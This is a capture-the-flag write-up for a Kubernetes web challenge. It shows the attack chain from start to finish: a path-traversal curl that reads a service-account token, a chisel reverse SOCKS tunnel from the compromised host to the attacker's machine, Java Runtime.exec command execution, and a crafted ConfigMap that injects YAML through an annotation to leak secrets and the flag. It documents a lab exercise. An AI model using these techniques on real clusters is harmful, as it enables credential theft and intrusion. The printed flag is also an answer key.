# Chapter 4: Uncle

## Challenge

Hi, TCC-CSIRT analyst,

Do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at `http://intro.lore.tcc`.

See you in the next incident!

Hint: Be sure you enter the flag for the correct chapter.

Hint: In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.

## Solution

### 1. Entry Point Discovery

The entry point for Chapter 4 is located at: `http://sam.lore.tcc/`. According to the hints, this is the final challenge, and we need to use artifacts collected in previous chapters:

- From **Chapter 1** (cgit), we have the source code of the `sam` web application.
- From **Chapter 2** (pimpam), we have access to an internal machine.
- From **Chapter 3** (jgames), we needed to explore further for hidden artifacts.

### 2. Inspecting the Source Code

The web application is written in **Flask**, and the main application code is in `app.py`. The application interacts with **Kubernetes**, and we noticed a hook in Kubernetes that triggers when a new `ConfigMap` is added or deleted.

The `app.py` file contains the following important function for creating `ConfigMap` objects:

```python
def create_map(self, name, data):
    body = {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {
            "name": name,
            "namespace": self.ns,
            "annotations": {
                "sam-operator/project_name": data["name"],
                "sam-operator/project_quota": data["quota"],
            },
        },
        "data": data,
    }
    return self.v1.create_namespaced_config_map(namespace=self.ns, body=body)
```

There is also a crucial **status template** which reveals how we can get the debug output and session information:

```html
{% if project_secret and ("debug" in project_secret["data"]) %}
<pre id="debug">
	{{ session }}
	{{ config }}
</pre>
{% endif %}
```

The `00-hook.py` script used by the Kubernetes operator processes added and deleted `ConfigMap` objects, updating secrets or deleting them when necessary. Here's the relevant part of the hook:

```python
UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
"""

if ctx["watchEvent"] == "Added":
    pname = ctx['object']['metadata']['name']
    storage = random_choice(MANAGED_STORAGE)
    access_token = token_hex(20)
    pquota = ctx['object']['metadata']['annotations']['sam-operator/project_quota']

    subprocess.run(
        ["kubectl", "apply", "-f", "-"],
        input=UPDATE_TEMPLATE.format(
            name=pname,
            queue_ns=QUEUE_NS,
            storage=storage,
            access_token=access_token,
            quota=pquota,
        ).encode()
    )
```

We could see that manipulating `sam-operator/project_quota` in the annotations could be the key to injecting arbitrary values into the secrets.

### 3. Trying to Use the Token

We found a Kubernetes service token on the **cgit** machine:

```bash
curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../run/secrets/kubernetes.io/serviceaccount/token
```

This revealed a valid Kubernetes token, which we inspected using JWT:

```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "exp": 1760908085,
  "iat": 1729372085,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "cgit",
    "pod": {
      "name": "cgit-6b4b6b5496-kvf86",
      "uid": "e8b3eea0-a1c9-4775-a803-7ac1c2576871"
    },
    "serviceaccount": {
      "name": "default",
      "uid": "3c331ba1-c216-4503-9f85-df30ea41c3ff"
    },
    "warnafter": 1729375692
  },
  "nbf": 1729372085,
  "sub": "system:serviceaccount:cgit:default"
}
```

To check what permissions the token had, we created a **SOCKS proxy** using **Chisel** to interact with Kubernetes:

On our local machine:
```bash
chisel server -p 2345 --reverse --socks5
```

On the compromised machine:
```bash
chisel client 10.200.0.57:2345 R:socks
2024/10/19 22:59:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

After modifying our `/etc/proxychains.conf` to use the proxy, we set up also environment variables:

```bash
export HTTP_PROXY=socks5://localhost:1080
export HTTPS_PROXY=socks5://localhost:1080
```

Now, we could run `kubectl` and `curl` commands:

```bash
kubectl --token=$(cat token_cgit.txt) --server=https://192.168.128.1 --insecure-skip-tls-verify=true auth can-i --list --namespace=sam-queue
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
services                                        []                                     []               [list get]
```

So we had no interesting permissions. We also tried listing services and interacting with endpoints using `kubectl` and `proxychains4 curl`, but with no success.

### 4. Revisiting the Jgames Machine

Returning to the **jgames** machine, we searched for files created after `2024-01-01`:

```bash
print (new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(
"find / -path /sys -prune -o -path /proc -prune -o -type f -newermt 2024-01-01 -print"
).getInputStream())).lines().collect(java.util.stream.Collectors.joining(java.lang.System.lineSeparator())))
```

This revealed an interesting file: `/mnt/kubecreds-jacob.config`, which contained Kubernetes credentials.

### 5. Using the Kubernetes Config

We used the discovered Kubernetes config to access the `sam-queue` namespace:

```bash
export KUBECONFIG=~/kubecreds-jacob.config
kubectl auth can-i --list --namespace=sam-queue
Resources                                       Non-Resource URLs   Resource Names   Verbs
configmaps                                      []                  []               [create delete]
```

We had permissions to **create** and **delete** `ConfigMaps`.

### 6. Exploiting ConfigMap Creation

The `app.py` file revealed how `ConfigMap` objects were created, and we discovered we could inject the `debug` parameter through the `sam-operator/project_quota` field.

We crafted an exploit:

1. First, we created a new request via the web application and read the `/status`

```json
{"name": "pokus", "quota": "1GB", "storage": "storage-hal-03", "txid": "c6405ee1561212446aadb86605e99228"}
{"access_token": "ZDQ5MTc5Zjc5OGU4YWM1ZDdiNTY0OTA5ZjhiOTM5YTQ1NWJmMDA4Yw==", "quota": "MUdC", "storage": "c3RvcmFnZS1oYWwtMDM="}
```

2. Next, we deleted the current `ConfigMap` using `kubectl`:

```bash
kubectl delete configmap request-c6405ee1561212446aadb86605e99228 -n sam-queue
```

3. Next, we created a new `ConfigMap` with the injected `debug` field:

**exploit.yaml**:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: request-c6405ee1561212446aadb86605e99228
  namespace: sam-queue
  annotations:
    sam-operator/project_name: name
    sam-operator/project_quota: |
      1GB"
        debug: "true
data:
  name: request-c6405ee1561212446aadb86605e99228
  quota: 1GB
```

```bash
kubectl create -f exploit.yaml
```

### 7. Retrieving the Flag

With the `debug` parameter injected, the `/status` page of the web application now revealed sensitive data, including the flag:

```
<SecureCookieSession {'csrf_token': '...', 'reqdata': {'name': 'pokus', 'quota': '1GB', 'txid': 'c6405ee1561212446aadb86605e99228'}}>
<Config {..., 'FLAG': 'FLAG{nP0c-X9Gh-bee7-iWxw}', ...}>
```

## Flag

```
FLAG{nP0c-X9Gh-bee7-iWxw}
```
